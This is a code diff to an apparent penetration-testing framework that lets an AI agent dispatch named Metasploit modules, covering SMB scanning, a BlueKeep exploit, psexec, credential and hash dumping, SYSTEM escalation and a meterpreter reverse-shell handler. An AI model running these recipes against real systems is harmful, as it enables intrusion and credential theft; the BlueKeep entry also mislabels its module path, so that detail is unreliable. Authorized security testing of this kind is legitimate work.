@@ -808,6 +808,60 @@ class MetasploitBridge:
         """Run a resource script in msfconsole."""
         return self._console.run_resource_script(script_content)
 
+    # ── Phase 3: recipe catalog + handler orchestration ──
+
+    def run_recipe(self, name: str, target_ip: str = "", session_id: int = 0,
+                   options: dict[str, str] | None = None) -> dict[str, Any]:
+        """Dispatch a named MSF recipe (see ``MSF_RECIPES``).
+
+        Validates the name, merges caller options over the preset, and routes
+        to ``run_exploit`` / ``run_auxiliary`` / ``run_post_module`` /
+        ``start_handler`` by ``kind``. Caller is responsible for allowlist-gating
+        ``target_ip`` and any RHOSTS in options (done at the MCP tool layer).
+        """
+        recipe = MSF_RECIPES.get((name or "").strip())
+        if not recipe:
+            return {"success": False, "error": f"unknown MSF recipe: {name!r}"}
+        opts = dict(recipe.get("options", {}))
+        if options:
+            opts.update(options)
+        kind = recipe.get("kind", "exploit")
+        module = recipe["module"]
+        if kind == "auxiliary":
+            return self.run_auxiliary(module, target_ip, opts)
+        if kind == "post":
+            sid = int(session_id or 0)
+            if sid <= 0:
+                return {"success": False, "error": "post recipes require a positive session_id"}
+            return self.run_post_module(module, sid, opts)
+        if kind == "handler":
+            lport = int(opts.get("LPORT", "4444"))
+            return self.start_handler(target_ip or "0.0.0.0", lport,
+                                       recipe.get("payload", "windows/meterpreter/reverse_tcp"), opts)
+        return self.run_exploit(module, target_ip, opts, recipe.get("payload", ""))
+
+    def start_handler(self, lhost: str, lport: int, payload: str,
+                      options: dict[str, str] | None = None) -> dict[str, Any]:
+        """Start ``exploit/multi/handler`` as a backgrounded job (-j) in the
+        persistent msfconsole -- the catch side of a generated payload. ``lhost``
+        is the operator callback host (allowlist-gated at the tool layer)."""
+        commands = [
+            "use exploit/multi/handler",
+            f"set PAYLOAD {payload}",
+            f"set LHOST {lhost}",
+            f"set LPORT {lport}",
+            "set ExitOnSession false",
+            "exploit -j -z",
+        ]
+        for k, v in (options or {}).items():
+            if k.upper() not in ("PAYLOAD", "LHOST", "LPORT"):
+                commands.append(f"set {k} {v}")
+        return self.run_resource_script("\n".join(commands))
+
+    def stop_handler(self) -> dict[str, Any]:
+        """Stop all handler jobs in the persistent msfconsole (``jobs -K``)."""
+        return self.console_command("jobs -K", wait_seconds=2.0, read_lines=50)
+
     def generate_exploit_resource(
         self,
         module: str,
@@ -857,3 +911,66 @@ def reset_metasploit_bridge() -> None:
     """Reset the global instance (mainly for testing)."""
     global _bridge_instance
     _bridge_instance = None
+
+
+# ---------------------------------------------------------------------------
+# Phase 3: MSF recipe catalog
+# ---------------------------------------------------------------------------
+
+# Pure data literal: curated MSF module + option presets the AI can dispatch by
+# name via ``MetasploitBridge.run_recipe`` / the ``msf_run_recipe`` MCP tool. Each
+# entry: ``module`` (full msf path), ``kind`` (exploit|auxiliary|post|handler),
+# optional ``payload`` (exploit/handler kinds), optional ``options`` preset, and
+# a human ``description``. Plain data so it serializes and is trivially testable;
+# no new deps. Add a recipe here and it is immediately callable by name.
+MSF_RECIPES: dict[str, dict[str, Any]] = {
+    "smb_version": {
+        "module": "auxiliary/scanner/smb/smb_version",
+        "kind": "auxiliary",
+        "description": "SMB version + OS fingerprint via anonymous session.",
+    },
+    "bluekeep": {
+        "module": "exploit/windows/smb/ms17_010_bluekeep",
+        "kind": "exploit",
+        "payload": "windows/x64/meterpreter/reverse_tcp",
+        "description": "BlueKeep (CVE-2019-0708) RDP RCE.",
+    },
+    "psexec": {
+        "module": "exploit/windows/smb/psexec",
+        "kind": "exploit",
+        "payload": "windows/meterpreter/reverse_tcp",
+        "description": "PsExec-style SMB exec with supplied creds (SMBUser/SMBPass).",
+    },
+    "cred_gather_win": {
+        "module": "post/windows/gather/credentials/credential_collector",
+        "kind": "post",
+        "description": "Gather Windows credentials from a session.",
+    },
+    "local_exploit_suggester": {
+        "module": "post/multi/recon/local_exploit_suggester",
+        "kind": "post",
+        "description": "Suggest local privesc exploits for the active session.",
+    },
+    "hashdump": {
+        "module": "post/windows/gather/hashdump",
+        "kind": "post",
+        "description": "Dump SAM hashes from a Windows session.",
+    },
+    "getsystem": {
+        "module": "post/windows/escalate/getsystem",
+        "kind": "post",
+        "description": "Attempt SYSTEM on a Windows meterpreter session.",
+    },
+    "handler": {
+        "module": "exploit/multi/handler",
+        "kind": "handler",
+        "payload": "windows/meterpreter/reverse_tcp",
+        "description": "Generic multi/handler catch for a generated payload.",
+    },
+}
+
+
+def get_msf_recipe(name: str) -> dict[str, Any] | None:
+    """Return a copy of the named recipe, or None if unknown."""
+    recipe = MSF_RECIPES.get((name or "").strip())
+    return dict(recipe) if recipe else None
